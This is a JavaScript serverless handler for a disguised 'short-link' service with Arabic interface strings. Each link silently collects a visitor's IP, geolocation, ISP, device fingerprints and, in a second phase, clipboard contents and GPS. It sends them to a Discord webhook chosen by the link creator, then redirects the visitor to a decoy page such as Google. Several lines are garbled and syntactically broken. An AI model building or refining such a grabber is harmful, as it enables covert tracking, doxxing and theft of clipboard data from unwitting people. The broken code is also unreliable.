// Short-link + visitor tracker.
// Storage: kvdb.io (free, no signup). Env: KVDB_BUCKET, WEBHOOK_URL.

const BUCKET = process.env.KVDB_BUCKET || null;
const KVDB_BASE = 'https://kvdb.io';

const CODE_CHARS = 'abcdefghijkmnpqrstuvwxyz23456789';
const CODE_LEN = 7;
const LINK_TTL = 60 * 60 * 24 * 30; // 30 days

function generateCode() {
  let out = '';
  for (let i = 0; i < CODE_LEN; i++) {
    out += CODE_CHARS[Math.floor(Math.random() * CODE_CHARS.length)];
  }
  return out;
}

async function kvGet(key) {
  if (!BUCKET) return null;
  try {
    const r = await fetch(
      KVDB_BASE + '/' + encodeURIComponent(BUCKET) + '/' + encodeURIComponent(key),
      { cache: 'no-store' }
    );
    if (!r.ok) return null;
    const text = await r.text();
    if (!text) return null;
    return JSON.parse(text);
  } catch {
    return null;
  }
}

async function kvSet(key, value, ttl = LINK_TTL) {
  if (!BUCKET) return false;
  try {
    const r = await fetch(
      KVDB_BASE + '/' + encodeURIComponent(BUCKET) + '/' + encodeURIComponent(key) +
        '?ttl=' + ttl,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(value),
      }
    );
    return r.ok;
  } catch {
    return false;
  }
}

function clientIp(h) {
  return (
    ((h['x-forwarded-for'] || '').split(',')[0] || '').trim() ||
    h['x-real-ip'] ||
    h['cf-connecting-ip'] ||
    'unknown'
  );
}

async function enrichServer(h) {
  const ip = clientIp(h);
  const s = {
    ip,
    country: h['x-vercel-ip-country'] || null,
    region: h['x-vercel-ip-country-region'] || null,
    city: h['x-vercel-ip-city']
      ? decodeURIComponent(h['x-vercel-ip-city'])
      : null,
    latitude: h['x-vercel-ip-latitude'] || null,
    longitude: h['x-vercel-ip-longitude'] || null,
    userAgent: h['user-agent'] || null,
    referer: h['referer'] || null,
    acceptLanguage: h['accept-language'] || null,
    timestamp: new Date().toISOString(),
  };
  if (!s.country && ip !== 'unknown') {
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 2500);
      const r = await fetch(
        'http://ip-api.com/json/' +
          encodeURIComponent(ip) +
          '?fields=status,country,regionName,city,lat,lon,isp,org,as,query',
        { signal: ctrl.signal }
      );
      clearTimeout(t);
      const g = await r.json();
      if (g && g.status === 'success') s.geoFallback = g;
    } catch {}
  }
  return s;
}

function truncate(v, n = 950) {
  if (v === undefined || v === null) return null;
  const s = typeof v === 'string' ? v : JSON.stringify(v);
  return s.length > n ? s.slice(0, n) + '…' : s;
}

function buildDiscordEmbed(server, body, code) {
  const f = body.fingerprint || {};
  const phase = body.phase || 'initial';
  const fields = [];
  const push = (name, value, inline = true) => {
    const v = truncate(value);
    if (v === null || v === '') return;
    fields.push({ name, value: v, inline });
  };

  push('IP', server.ip);
  push('Country', server.country);
  push('City', server.city);
  push('Region', server.region);
  push('ISP / Org', server.geoFallback?.isp || server.geoFallback?.org);
  push('ASN', server.geoFallback?.as);
  push('Latitude', server.latitude || server.geoFallback?.lat);
  push('Longitude', server.longitude || server.geoFallback?.lon);
  push('User-Agent', server.userAgent, false);

  if (phase === 'supplement') {
    push('📋 Clipboard', body.clipboard, false);
    push('📍 GPS (device)', body.gps, false);
  } else {
    push('Platform', f.platform);
    push('Screen', f.screen);
    push('Viewport', f.viewport);
    push('DPR', f.dpr);
    push('Timezone', f.timezone);
    push('Language', f.language);
    push('Languages', f.languages);
    push('Cores', f.cores);
    push('Memory (GB)', f.memory);
    push('Touch', f.touch);
    push('Mobile', f.mobile);
    push('Device Model', f.deviceModel);
    push('Connection', f.connection);
    push('Battery', f.battery);
    push('Media devices', f.mediaDevices);
    push('Cookies enabled', f.cookies);
    push('Canvas FP', f.canvas, false);
    push('WebGL', f.webgl, false);
    push('Audio FP', f.audio, false);
    push('Plugins', f.plugins, false);
    push('Page URL', f.url, false);
    push('Page Referrer', f.referrer, false);
    push('GPS (auto)', f.gps, false);
  }

  const kept = [];
  let total = 0;
  for (const fld of fields) {
    const cost = fld.name.length + fld.value.length + 12;
    if (total + cost > 5600) break;
    kept.push(fld);
    total += cost;
  }

  return {
    username: 'short-link',
    embeds: [
      {
        title: phase === 'supplement' ? '🔓 بيانات إضافية' : '👁️ زائر جديد',
        description: '`/' + code + '`',
        color: phase === 'supplement' ? 0x22c55e : 0xe11d48,
        timestamp: server.timestamp,
        fields: kept.slice(0, 25),
      },
    ],
  };
}

async function handleShorten(req, res) {
  const body = req.body || {};
  const webhook = (body.webhook || '').trim();
  const decoy = (body.decoy || '').trim() || 'https://www.google.com';

  if (!webhook || !/^https?:\/\//i.test(webhook)) {
    return res.status(400).json({ error: 'رابط ويب هوك غير صالح' });
  }
  if (!BUCKET) {
    return res.status(500).json({
      error: 'التخزين غير مهيّأ. أضف KVDB_BUCKET في Environment Variables.',
    });
  }

  let code = generateCode();
  for (let i = 0; i < 3; i++) {
    const exists = await kvGet('short:' + code);
    if (!exists) break;
    code = generateCode();
  }

  const ok = await kvSet('short:' + code, {
    w: webhook,
    d: decoy,
    t: Date.now(),
  });
json  if (!ok) return res.status(500).json({ error: 'فشل حفظ الرابط في kvdb' });

  const proto = req.headers['x-forwarded-proto'] || 'https';
  const host =
    req.headers['x-forwarded-host'] || req.headers.host || 'localhost';
  const short = proto + '://' + host + '/' + code;

  res.json({ short, code, decoy });
}

async function handleTrack(req, res) {
  const({ body error = req.body || {};
  const code = body.code;
  if (!code) return res.status(400).json({ error: 'missing code' });

  const entry = await kvGet('short:' + code);
  if (!entry) {
    return res
      .status(404)
      .: 'unknown code', redirect: 'https://www.google.com' });
  }

  const server = await enrichServer(req.headers);
  const webhook = entry.w;
  const decoy = entry.d || 'https://www.google.com';
  const isDiscord = /discord(app)?\.com\/api\/webhooks/.test(webhook);

  const payload = isDiscord
    ? buildDiscordEmbed(server, body, code)
    : { code, phase: body.phase, server, ...body };

  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 4500);
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: ctrl.signal,
    });
    clearTimeout(t);
  } catch {}

  res.json({ ok: true, redirect: decoy });
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store');

  if (req.method === 'OPTIONS') return res.status(204).end();

  const path = (req.url || '').split('?')[0];
  if (path === '/api/shorten') return handleShorten(req, res);
  if (path === '/api/track') return handleTrack(req, res);

  res.status(404).json({ error: 'not found' });
};
